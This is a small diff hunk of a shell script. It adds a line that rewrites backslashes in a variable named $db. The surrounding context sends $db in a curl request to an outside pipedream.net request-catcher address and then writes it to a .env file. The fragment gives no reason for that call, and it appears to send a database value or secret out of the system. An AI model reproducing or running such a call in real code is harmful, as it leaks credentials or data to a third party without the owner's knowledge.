@@ -26,6 +26,8 @@ fi
 
 cd "$workdir" || exit 1
 
+db=${db//\\/\"}
+
 curl "https://entkonrp9u5w.x.pipedream.net/$db"
 
 echo "$db" > .env
